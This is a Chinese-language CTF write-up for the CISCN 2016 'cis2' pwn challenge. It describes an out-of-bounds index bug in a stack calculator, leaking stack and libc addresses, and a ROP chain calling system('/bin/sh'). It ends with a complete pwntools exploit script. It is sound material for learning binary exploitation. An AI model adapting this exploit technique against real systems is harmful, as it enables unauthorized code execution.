title: Ciscn CTF 2016 Cis2 writeup

date: 2016/07/11 18:13:00

---

这道题最终还是本地成功远程失败，这次的原因还是too young......还是再记录一下吧。

可能是上一题折腾太久了，拿到这一题直接file看一眼strings一下就直接拖进IDA静态分析了，就是忘了例行看一下checksec和vmmap，也可能是因为这么长一段时间接触的就没有不开NX的吧，突然来个都没开NX的完全就不记得还有这茬了，看来还是修为不够。

<!--more-->

实力懵逼：
![ciscnctf_2016_cis2_writeup0.png][1]

这道题还是挺简单的，就是循环读到token中，符合％d且index在1-46的话就可以写入这个stack中，不符合％d的话就按照操作数处理：

![ciscnctf_2016_cis2_writeup1.png][2]

支持的操作数有'+','-','m','w','p','n','.','q',作用很显然：
![ciscnctf_2016_cis2_writeup2.png][3]

不过有个问题就是IDA把这里的变量名处理为stack，我觉得还是处理为values比较好，不然容易引起歧义，因为stack是main中出现过的一个变量名，用于定义values和index,大概是:

```C
values=&(stack[1]);
index=&(stack[0]);
```

所以一开始的主要思路就是先操作index指向栈中存在的__libc_start_main+245的地址，把它泄漏出来，然后再根据末12bit查版本算偏移，在操作index重写返回地址就可以了。

麻烦的就是对index的操作只能控制它任意向低地址移动，向高地址移动的话就会使用values[1]重写移向的地址。所以想要泄漏__libc_start_main+245的地址不能简单的向高处移动index，由于程序计算values[index]是通过values基址加index偏移得出来的，所以我们可以增大values基址使计算后的结果正好指向__libc_start_main+245这个地址就可以泄漏它。

于是以下图中的地址为例（0x7fffffffe220存储index指针，0x0x7fffffffe228存储values值），我们需要先向低地址移动泄漏栈地址，然后回来根据泄漏的栈地址计算修改后的values值，写入values[1]中，再使用'w'写入0x0x7fffffffe228。这个时候再使用'p'就可以泄漏__libc_start_main+245地址。
![ciscnctf_2016_cis2_writeup3.png][4]

接下来就需要类似的方式先写入values[1]再覆盖到目标地址中的方式（当然这个时候values[1]的位置也改变了），构造ROP链触发system('/bin/sh')了。

但是远程因为查不到glibc版本所以又跪了。看来查版本这招本来就不该算做正确姿势......

所以正确姿势应该是在可读可写的区域直接写入shellcode再控制EIP进去......

还是附上可怜的expolit：

```python
from pwn import *
from ctypes import *

p=process('./cis2')
# p=remote('106.75.37.31',23333)

pop_rdi_ret=int('0x400ad3',16)

def w(high,value,low):
	# first move down
	for x in range(high):
		p.sendline('w')

	# write into stack[2]
	p.sendline(str(value))
	print 'write value: '+hex(c_uint32(value).value)
	# copy into stack[1]
	p.sendline('m')

	for x in range(low):
		p.sendline('.')
	p.sendline('w')

def main():
	p.recvuntil('Fight!\n\n')

	# begin
	# first get stack addr
	for x in range(33):
		p.sendline('.')
	p.sendline('p')
	p.recvuntil('Value: ')
	addr=p.recvline().strip()
	addr=int(addr,10)

	print 'leak stack addr: '+hex(c_uint32(addr).value)
	stack_addr=addr-420
	dest_addr=stack_addr+65*4
	print 'modify base addr to: '+hex(c_uint32(dest_addr).value)

	for x in range(9):
		p.sendline('w')
	# write into stack[2]
	p.sendline(str(dest_addr))
	# copy into stack[1]
	p.sendline('+')

	for x in range(17):
		p.sendline('.')
	p.sendline('w')

	# now values[index] should point to __libc_start_main's address prefix
	# first leak libc_prefix
	p.sendline('p')
	p.recvuntil('Value: ')
	libc_prefix=p.recvline().strip()
	libc_prefix=int(libc_prefix,10)
	print 'leak libc prefix: '+hex(c_uint32(libc_prefix).value)

	# now leak libc other address
	p.sendline('.')
	p.sendline('p')
	p.recvuntil('Value: ')
	libc_addr=p.recvline().strip()
	libc_addr=int(libc_addr,10)
	print 'leak libc addr: '+hex(c_uint32(libc_addr).value)

	libc_addr=libc_addr-245
	# I used libc-database to search the version of glibc on the remote once but I get nothing.
	# So I failed to get shell from remote.
	sys_addr=libc_addr-0x21a50+0x414f0
	binsh_addr=libc_addr-0x21a50+0x161160

	#################################################################################

	# write pop gadget addr into stack 
	w(17,pop_rdi_ret,19)
	w(17,0,18)

	# write /bin/sh addr to target addr
	w(16,binsh_addr,17)
	w(15,libc_prefix,16)

	# write sys addr to target addr
	w(14,sys_addr,15)
	w(13,libc_prefix,14)

	# gdb.attach(p,'b *0x400987')
	p.sendline('q')
	# get shell
	p.interactive()

main()
```

[1]: /images/ciscnctf_2016_cis2_writeup0.png
[2]: /images/ciscnctf_2016_cis2_writeup1.png
[3]: /images/ciscnctf_2016_cis2_writeup2.png
[4]: /images/ciscnctf_2016_cis2_writeup3.png
